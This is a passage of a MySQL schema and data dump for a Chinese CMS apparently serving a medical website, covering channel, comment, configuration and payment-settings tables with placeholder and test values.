INSERT INTO `jc_channel` VALUES ('95', '1', '1', '75', 'hzyd', '4', '5', '3', '1', '1', null);
INSERT INTO `jc_channel` VALUES ('96', '1', '1', '75', 'wzxw', '6', '7', '1', '1', '1', null);

-- ----------------------------
-- Table structure for jc_channel_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_attr`;
CREATE TABLE `jc_channel_attr` (
  `channel_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_channel` (`channel_id`),
  CONSTRAINT `fk_jc_attr_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目扩展属性表';

-- ----------------------------
-- Records of jc_channel_attr
-- ----------------------------

-- ----------------------------
-- Table structure for jc_channel_count
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_count`;
CREATE TABLE `jc_channel_count` (
  `channel_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `content_count_total` int(11) NOT NULL DEFAULT '0' COMMENT '内容发布数',
  `content_count_day` int(11) NOT NULL DEFAULT '0' COMMENT '内容今日发布数',
  `content_count_week` int(11) NOT NULL DEFAULT '0' COMMENT '内容本周发布数',
  `content_count_month` int(11) NOT NULL DEFAULT '0' COMMENT '内容本月发布数',
  `content_count_year` int(11) NOT NULL DEFAULT '0' COMMENT '内容今年发布数',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_count_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目访问量计数表';

-- ----------------------------
-- Records of jc_channel_count
-- ----------------------------
INSERT INTO `jc_channel_count` VALUES ('75', '472', '0', '0', '0', '50', '20', '28', '28', '28');
INSERT INTO `jc_channel_count` VALUES ('76', '246', '10', '1', '1', '11', '0', '0', '0', '0');
INSERT INTO `jc_channel_count` VALUES ('77', '120', '3', '1', '1', '15', '0', '0', '0', '0');
INSERT INTO `jc_channel_count` VALUES ('78', '33', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_channel_count` VALUES ('81', '76', '0', '0', '0', '10', '0', '0', '0', '0');
INSERT INTO `jc_channel_count` VALUES ('82', '6', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_channel_count` VALUES ('94', '11', '0', '0', '0', '16', '16', '16', '16', '16');
INSERT INTO `jc_channel_count` VALUES ('95', '1', '1', '0', '0', '12', '12', '12', '12', '12');
INSERT INTO `jc_channel_count` VALUES ('96', '30', '0', '0', '0', '0', '0', '0', '0', '0');

-- ----------------------------
-- Table structure for jc_channel_department
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_department`;
CREATE TABLE `jc_channel_department` (
  `channel_id` int(11) NOT NULL,
  `department_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`department_id`),
  KEY `fk_jc_channel_department` (`department_id`),
  CONSTRAINT `fk_jc_channel_department` FOREIGN KEY (`department_id`) REFERENCES `jc_department` (`depart_id`),
  CONSTRAINT `fk_jc_department_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目部门关联表';

-- ----------------------------
-- Records of jc_channel_department
-- ----------------------------
INSERT INTO `jc_channel_department` VALUES ('75', '1');
INSERT INTO `jc_channel_department` VALUES ('76', '1');
INSERT INTO `jc_channel_department` VALUES ('77', '1');
INSERT INTO `jc_channel_department` VALUES ('78', '1');
INSERT INTO `jc_channel_department` VALUES ('81', '1');
INSERT INTO `jc_channel_department` VALUES ('82', '1');
INSERT INTO `jc_channel_department` VALUES ('94', '1');
INSERT INTO `jc_channel_department` VALUES ('95', '1');
INSERT INTO `jc_channel_department` VALUES ('96', '1');

-- ----------------------------
-- Table structure for jc_channel_depart_control
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_depart_control`;
CREATE TABLE `jc_channel_depart_control` (
  `channel_id` int(11) NOT NULL,
  `department_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`department_id`),
  KEY `fk_jc_channel_department` (`department_id`),
  CONSTRAINT `fk_jc_channel_depart_control` FOREIGN KEY (`department_id`) REFERENCES `jc_department` (`depart_id`),
  CONSTRAINT `fk_jc_depart_control_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS部门栏目数据权限关联表';

-- ----------------------------
-- Records of jc_channel_depart_control
-- ----------------------------
INSERT INTO `jc_channel_depart_control` VALUES ('75', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('76', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('77', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('78', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('81', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('82', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('94', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('95', '1');
INSERT INTO `jc_channel_depart_control` VALUES ('96', '1');

-- ----------------------------
-- Table structure for jc_channel_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_ext`;
CREATE TABLE `jc_channel_ext` (
  `channel_id` int(11) NOT NULL,
  `channel_name` varchar(100) NOT NULL COMMENT '名称',
  `final_step` tinyint(4) DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) DEFAULT NULL COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_static_channel` char(1) NOT NULL DEFAULT '0' COMMENT '是否栏目静态化',
  `is_static_content` char(1) NOT NULL DEFAULT '0' COMMENT '是否内容静态化',
  `is_access_by_dir` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用目录访问',
  `is_list_child` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用子栏目列表',
  `page_size` int(11) NOT NULL DEFAULT '20' COMMENT '每页多少条记录',
  `channel_rule` varchar(150) DEFAULT NULL COMMENT '栏目页生成规则',
  `content_rule` varchar(150) DEFAULT NULL COMMENT '内容页生成规则',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_channel` varchar(100) DEFAULT NULL COMMENT '栏目页模板',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容页模板',
  `title_img` varchar(100) DEFAULT NULL COMMENT '缩略图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有缩略图',
  `has_content_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有内容图',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图高度',
  `comment_control` int(11) NOT NULL DEFAULT '0' COMMENT '评论(0:匿名;1:会员一次;2:关闭,3会员多次)',
  `allow_updown` tinyint(1) NOT NULL DEFAULT '1' COMMENT '顶踩(true:开放;false:关闭)',
  `is_blank` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否新窗口打开',
  `title` varchar(255) DEFAULT NULL COMMENT 'TITLE',
  `keywords` varchar(255) DEFAULT NULL COMMENT 'KEYWORDS',
  `description` varchar(255) DEFAULT NULL COMMENT 'DESCRIPTION',
  `allow_share` tinyint(1) NOT NULL DEFAULT '0' COMMENT '分享(true:开放;false:关闭)',
  `allow_score` tinyint(1) NOT NULL DEFAULT '0' COMMENT '评分(true:开放;false:关闭)',
  `tpl_mobile_channel` varchar(100) DEFAULT NULL COMMENT '手机栏目页模板',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_ext_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目内容表';

-- ----------------------------
-- Records of jc_channel_ext
-- ----------------------------
INSERT INTO `jc_channel_ext` VALUES ('75', '新闻资讯', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/news.html', null, null, null, '0', '0', '510', '288', '310', '310', '2', '0', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/channel/news.html');
INSERT INTO `jc_channel_ext` VALUES ('76', '专家团队', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/pic_team.html', null, null, null, '0', '0', '510', '288', '310', '310', '0', '1', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/channel/pic_team.html');
INSERT INTO `jc_channel_ext` VALUES ('77', '空中课堂', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '1', '0', '510', '288', '310', '310', '2', '0', '0', null, null, null, '0', '0', '');
INSERT INTO `jc_channel_ext` VALUES ('78', '预约会诊', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '');
INSERT INTO `jc_channel_ext` VALUES ('81', '关于我们', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/alone/alone_about.html', null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/alone/alone_about.html');
INSERT INTO `jc_channel_ext` VALUES ('82', '留言板', null, null, '0', '0', '0', '0', '10', null, null, '/guestbook.jspx', null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '');
INSERT INTO `jc_channel_ext` VALUES ('94', '医生论坛', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/news.html', null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/channel/news.html');
INSERT INTO `jc_channel_ext` VALUES ('95', '患者园地', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/news.html', null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/channel/news.html');
INSERT INTO `jc_channel_ext` VALUES ('96', '网站新闻', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/news.html', null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/channel/news.html');

-- ----------------------------
-- Table structure for jc_channel_model
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_model`;
CREATE TABLE `jc_channel_model` (
  `channel_id` int(11) NOT NULL,
  `model_id` int(11) NOT NULL COMMENT '模型id',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  PRIMARY KEY (`channel_id`,`priority`),
  KEY `fk_jc_model_channel_m` (`model_id`),
  CONSTRAINT `fk_jc_channel_model_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_model_channel_m` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='栏目可选内容模型表';

-- ----------------------------
-- Records of jc_channel_model
-- ----------------------------
INSERT INTO `jc_channel_model` VALUES ('75', '1', '/WEB-INF/t/cms/www/default/content/news2.html', '0', '/WEB-INF/t/cms/www/mobile/content/news.html');
INSERT INTO `jc_channel_model` VALUES ('76', '5', '', '0', '');
INSERT INTO `jc_channel_model` VALUES ('77', '6', '', '0', '');
INSERT INTO `jc_channel_model` VALUES ('81', '9', '/WEB-INF/t/cms/www/default/content/doc_pdfjs.html', '0', '');

-- ----------------------------
-- Table structure for jc_channel_txt
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_txt`;
CREATE TABLE `jc_channel_txt` (
  `channel_id` int(11) NOT NULL,
  `txt` longtext COMMENT '栏目内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_txt_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目文本表';

-- ----------------------------
-- Records of jc_channel_txt
-- ----------------------------

-- ----------------------------
-- Table structure for jc_channel_user
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_user`;
CREATE TABLE `jc_channel_user` (
  `channel_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`user_id`),
  KEY `fk_jc_channel_user` (`user_id`),
  CONSTRAINT `fk_jc_channel_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目用户关联表';

-- ----------------------------
-- Records of jc_channel_user
-- ----------------------------

-- ----------------------------
-- Table structure for jc_chnl_group_contri
-- ----------------------------
DROP TABLE IF EXISTS `jc_chnl_group_contri`;
CREATE TABLE `jc_chnl_group_contri` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_c` (`group_id`),
  CONSTRAINT `fk_jc_channel_group_c` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_channel_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目投稿会员组关联表';

-- ----------------------------
-- Records of jc_chnl_group_contri
-- ----------------------------
INSERT INTO `jc_chnl_group_contri` VALUES ('75', '1');
INSERT INTO `jc_chnl_group_contri` VALUES ('76', '1');
INSERT INTO `jc_chnl_group_contri` VALUES ('77', '1');
INSERT INTO `jc_chnl_group_contri` VALUES ('94', '1');
INSERT INTO `jc_chnl_group_contri` VALUES ('95', '1');
INSERT INTO `jc_chnl_group_contri` VALUES ('96', '1');
INSERT INTO `jc_chnl_group_contri` VALUES ('75', '2');
INSERT INTO `jc_chnl_group_contri` VALUES ('76', '2');
INSERT INTO `jc_chnl_group_contri` VALUES ('77', '2');
INSERT INTO `jc_chnl_group_contri` VALUES ('94', '2');
INSERT INTO `jc_chnl_group_contri` VALUES ('95', '2');
INSERT INTO `jc_chnl_group_contri` VALUES ('96', '2');

-- ----------------------------
-- Table structure for jc_chnl_group_view
-- ----------------------------
DROP TABLE IF EXISTS `jc_chnl_group_view`;
CREATE TABLE `jc_chnl_group_view` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_v` (`group_id`),
  CONSTRAINT `fk_jc_channel_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_channel_v` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目浏览会员组关联表';

-- ----------------------------
-- Records of jc_chnl_group_view
-- ----------------------------

-- ----------------------------
-- Table structure for jc_comment
-- ----------------------------
DROP TABLE IF EXISTS `jc_comment`;
CREATE TABLE `jc_comment` (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `comment_user_id` int(11) DEFAULT NULL COMMENT '评论用户ID',
  `reply_user_id` int(11) DEFAULT NULL COMMENT '回复用户ID',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `create_time` datetime NOT NULL COMMENT '评论时间',
  `reply_time` datetime DEFAULT NULL COMMENT '回复时间',
  `ups` smallint(6) NOT NULL DEFAULT '0' COMMENT '支持数',
  `downs` smallint(6) NOT NULL DEFAULT '0' COMMENT '反对数',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `score` int(11) DEFAULT NULL COMMENT '评分',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级评论',
  `reply_count` int(11) DEFAULT '0' COMMENT '回复数',
  PRIMARY KEY (`comment_id`),
  KEY `fk_jc_comment_content` (`content_id`),
  KEY `fk_jc_comment_reply` (`reply_user_id`),
  KEY `fk_jc_comment_site` (`site_id`),
  KEY `fk_jc_comment_user` (`comment_user_id`),
  CONSTRAINT `fk_jc_comment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_comment_reply` FOREIGN KEY (`reply_user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_comment_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_comment_user` FOREIGN KEY (`comment_user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8 COMMENT='CMS评论表';

-- ----------------------------
-- Records of jc_comment
-- ----------------------------
INSERT INTO `jc_comment` VALUES ('18', '1', null, '12', '1', '2017-02-05 13:12:22', null, '0', '0', '0', '1', null, null, '0');
INSERT INTO `jc_comment` VALUES ('19', '1', null, '28', '1', '2017-02-05 13:33:32', null, '0', '0', '0', '0', null, null, '0');
INSERT INTO `jc_comment` VALUES ('20', '1', null, '28', '1', '2017-02-05 13:52:27', null, '0', '0', '0', '0', null, null, '0');
INSERT INTO `jc_comment` VALUES ('21', '1', null, '28', '1', '2017-02-05 13:55:20', null, '0', '0', '0', '0', null, null, '0');
INSERT INTO `jc_comment` VALUES ('22', '1', null, '28', '1', '2017-02-05 13:57:18', null, '0', '0', '0', '0', null, null, '0');
INSERT INTO `jc_comment` VALUES ('23', '1', null, '14', '1', '2017-02-05 14:36:13', null, '0', '0', '0', '0', null, null, '0');

-- ----------------------------
-- Table structure for jc_comment_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_comment_ext`;
CREATE TABLE `jc_comment_ext` (
  `comment_id` int(11) NOT NULL,
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `text` longtext COMMENT '评论内容',
  `reply` longtext COMMENT '回复内容',
  KEY `fk_jc_ext_comment` (`comment_id`),
  CONSTRAINT `fk_jc_ext_comment` FOREIGN KEY (`comment_id`) REFERENCES `jc_comment` (`comment_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS评论扩展表';

-- ----------------------------
-- Records of jc_comment_ext
-- ----------------------------
INSERT INTO `jc_comment_ext` VALUES ('18', '127.0.0.1', 'qeqweq', null);
INSERT INTO `jc_comment_ext` VALUES ('19', '127.0.0.1', 'sfasfasdf', null);
INSERT INTO `jc_comment_ext` VALUES ('20', '127.0.0.1', 'hahahaha', null);
INSERT INTO `jc_comment_ext` VALUES ('21', '127.0.0.1', '好', null);
INSERT INTO `jc_comment_ext` VALUES ('22', '127.0.0.1', '123123', null);
INSERT INTO `jc_comment_ext` VALUES ('23', '127.0.0.1', 'sfasfsaf', null);

-- ----------------------------
-- Table structure for jc_config
-- ----------------------------
DROP TABLE IF EXISTS `jc_config`;
CREATE TABLE `jc_config` (
  `config_id` int(11) NOT NULL,
  `context_path` varchar(20) DEFAULT '' COMMENT '部署路径',
  `servlet_point` varchar(20) DEFAULT NULL COMMENT 'Servlet挂载点',
  `port` int(11) DEFAULT NULL COMMENT '端口',
  `db_file_uri` varchar(50) NOT NULL DEFAULT '/dbfile.svl?n=' COMMENT '数据库附件访问地址',
  `is_upload_to_db` tinyint(1) NOT NULL DEFAULT '0' COMMENT '上传附件至数据库',
  `def_img` varchar(255) NOT NULL DEFAULT '/caihongyixue/r/cms/www/default/no_picture.gif' COMMENT '图片不存在时默认图片',
  `login_url` varchar(255) NOT NULL DEFAULT '/login.jspx' COMMENT '登录地址',
  `process_url` varchar(255) DEFAULT NULL COMMENT '登录后处理地址',
  `mark_on` tinyint(1) NOT NULL DEFAULT '1' COMMENT '开启图片水印',
  `mark_width` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小宽度',
  `mark_height` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小高度',
  `mark_image` varchar(100) DEFAULT '/r/cms/www/watermark.png' COMMENT '图片水印',
  `mark_content` varchar(100) NOT NULL DEFAULT 'www.caihongyixue.com' COMMENT '文字水印内容',
  `mark_size` int(11) NOT NULL DEFAULT '20' COMMENT '文字水印大小',
  `mark_color` varchar(10) NOT NULL DEFAULT '#FF0000' COMMENT '文字水印颜色',
  `mark_alpha` int(11) NOT NULL DEFAULT '50' COMMENT '水印透明度（0-100）',
  `mark_position` int(11) NOT NULL DEFAULT '1' COMMENT '水印位置(0-5)',
  `mark_offset_x` int(11) NOT NULL DEFAULT '0' COMMENT 'x坐标偏移量',
  `mark_offset_y` int(11) NOT NULL DEFAULT '0' COMMENT 'y坐标偏移量',
  `count_clear_time` date NOT NULL COMMENT '计数器清除时间',
  `count_copy_time` datetime NOT NULL COMMENT '计数器拷贝时间',
  `download_code` varchar(32) NOT NULL DEFAULT 'caihongyixue' COMMENT '下载防盗链md5混淆码',
  `download_time` int(11) NOT NULL DEFAULT '12' COMMENT '下载有效时间（小时）',
  `email_host` varchar(50) DEFAULT NULL COMMENT '邮件发送服务器',
  `email_encoding` varchar(20) DEFAULT NULL COMMENT '邮件发送编码',
  `email_username` varchar(100) DEFAULT NULL COMMENT '邮箱用户名',
  `email_password` varchar(100) DEFAULT NULL COMMENT '邮箱密码',
  `email_personal` varchar(100) DEFAULT NULL COMMENT '邮箱发件人',
  `email_validate` tinyint(1) DEFAULT '0' COMMENT '开启邮箱验证',
  `office_home` varchar(255) NOT NULL COMMENT 'openoffice安装目录',
  `office_port` varchar(10) NOT NULL DEFAULT '8810' COMMENT 'openoffice端口',
  `swftools_home` varchar(255) NOT NULL COMMENT 'swftoos安装目录',
  `view_only_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '只有终审才能浏览内容页',
  `inside_site` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内网（通过站点路径区分站点）',
  `flow_clear_time` date NOT NULL COMMENT '流量统计清除时间',
  `channel_count_clear_time` date NOT NULL COMMENT '栏目发布内容计数器清除时间',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置表';

-- ----------------------------
-- Records of jc_config
-- ----------------------------
INSERT INTO `jc_config` VALUES ('1', null, null, '80', '/dbfile.svl?n=', '0', '/r/cms/www/no_picture.gif', '/login.jspx', null, '0', '120', '120', '/r/cms/www/watermark.png', 'www.caihongyixue.com', '40', '#FF0000', '100', '1', '0', '0', '2017-02-05', '2017-02-05 13:26:20', 'caihongyixue', '12', null, null, null, null, null, '0', '/opt/openoffice', '8820', 'D:/SWFTools/pdf2swf.exe', '0', '0', '2017-02-05', '2017-01-16');

-- ----------------------------
-- Table structure for jc_config_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_attr`;
CREATE TABLE `jc_config_attr` (
  `config_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_config` (`config_id`),
  CONSTRAINT `fk_jc_attr_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置属性表';

-- ----------------------------
-- Records of jc_config_attr
-- ----------------------------
INSERT INTO `jc_config_attr` VALUES ('1', 'password_min_len', '6');
INSERT INTO `jc_config_attr` VALUES ('1', 'username_reserved', '');
INSERT INTO `jc_config_attr` VALUES ('1', 'register_on', 'true');
INSERT INTO `jc_config_attr` VALUES ('1', 'member_on', 'true');
INSERT INTO `jc_config_attr` VALUES ('1', 'username_min_len', '2');
INSERT INTO `jc_config_attr` VALUES ('1', 'version', 'caihongyixue-v8');
INSERT INTO `jc_config_attr` VALUES ('1', 'user_img_height', '98');
INSERT INTO `jc_config_attr` VALUES ('1', 'user_img_width', '143');
INSERT INTO `jc_config_attr` VALUES ('1', 'check_on', 'false');
INSERT INTO `jc_config_attr` VALUES ('1', 'new_picture', '/r/cms/www/new.gif');
INSERT INTO `jc_config_attr` VALUES ('1', 'day', '3');
INSERT INTO `jc_config_attr` VALUES ('1', 'preview', 'false');
INSERT INTO `jc_config_attr` VALUES ('1', 'qqEnable', 'false');
INSERT INTO `jc_config_attr` VALUES ('1', 'sinaKey', '');
INSERT INTO `jc_config_attr` VALUES ('1', 'sinaEnable', 'false');
INSERT INTO `jc_config_attr` VALUES ('1', 'qqID', '101139646');
INSERT INTO `jc_config_attr` VALUES ('1', 'qqKey', '');
INSERT INTO `jc_config_attr` VALUES ('1', 'sinaID', '2510334929');
INSERT INTO `jc_config_attr` VALUES ('1', 'qqWeboEnable', 'false');
INSERT INTO `jc_config_attr` VALUES ('1', 'qqWeboKey', '');
INSERT INTO `jc_config_attr` VALUES ('1', 'qqWeboID', '801526383');
INSERT INTO `jc_config_attr` VALUES ('1', 'ssoEnable', 'true');
INSERT INTO `jc_config_attr` VALUES ('1', 'flowSwitch', 'true');
INSERT INTO `jc_config_attr` VALUES ('1', 'contentFreshMinute', '0');
INSERT INTO `jc_config_attr` VALUES ('1', 'codeImgWidth', '160');
INSERT INTO `jc_config_attr` VALUES ('1', 'codeImgHeight', '160');
INSERT INTO `jc_config_attr` VALUES ('1', 'reward_fix_4', '4');
INSERT INTO `jc_config_attr` VALUES ('1', 'reward_fix_1', '1');
INSERT INTO `jc_config_attr` VALUES ('1', 'reward_fix_3', '3');
INSERT INTO `jc_config_attr` VALUES ('1', 'reward_fix_2', '2');
INSERT INTO `jc_config_attr` VALUES ('1', 'reward_fix_5', '5');
INSERT INTO `jc_config_attr` VALUES ('1', 'reward_fix_6', '6');
INSERT INTO `jc_config_attr` VALUES ('1', 'weixinAppId', '1212');
INSERT INTO `jc_config_attr` VALUES ('1', 'weixinAppSecret', '121212');
INSERT INTO `jc_config_attr` VALUES ('1', 'weixinLoginId', '1212');
INSERT INTO `jc_config_attr` VALUES ('1', 'weixinLoginSecret', '121212');
INSERT INTO `jc_config_attr` VALUES ('1', 'sso_1', 'http://bbs.caihongyixue.com/sso/authenticate.jspx');

-- ----------------------------
-- Table structure for jc_config_content_charge
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_content_charge`;
CREATE TABLE `jc_config_content_charge` (
  `config_content_id` int(11) NOT NULL DEFAULT '1',
  `weixin_appid` varchar(255) NOT NULL DEFAULT '' COMMENT '微信服务号APPID',
  `weixin_secret` varchar(50) NOT NULL DEFAULT '' COMMENT '微信公众号secret',
  `weixin_account` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户号',
  `weixin_password` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户密钥',
  `alipay_partner_id` varchar(255) DEFAULT NULL COMMENT '支付宝合作者ID',
  `alipay_account` varchar(255) DEFAULT NULL COMMENT '支付宝签约账户',
  `alipay_key` varchar(1000) DEFAULT NULL COMMENT '支付宝公钥',
  `alipay_appid` varchar(255) DEFAULT NULL COMMENT '支付宝应用ID',
  `alipay_public_key` varchar(255) DEFAULT '' COMMENT '支付宝RSA公钥',
  `alipay_private_key` varchar(1000) DEFAULT NULL COMMENT '支付宝RSA私钥',
  `charge_ratio` double(5,2) NOT NULL DEFAULT '0.00' COMMENT '抽成比例',
  `min_draw_amount` double(11,2) NOT NULL DEFAULT '1.00' COMMENT '最小提现额',
  `commission_total` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成总金额',
  `commission_year` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成年金额',
  `commission_month` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成月金额',
  `commission_day` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `pay_transfer_password` varchar(100) NOT NULL DEFAULT '5f4dcc3b5aa765d61d8327deb882cf99' COMMENT '转账支付密码（管理后台验证）',
  `transfer_api_password` varchar(100) NOT NULL DEFAULT '' COMMENT '企业转账接口API密钥',
  `reward_min` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  `reward_max` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT '0' COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`config_content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='内容收费配置';

-- ----------------------------
-- Records of jc_config_content_charge
-- ----------------------------
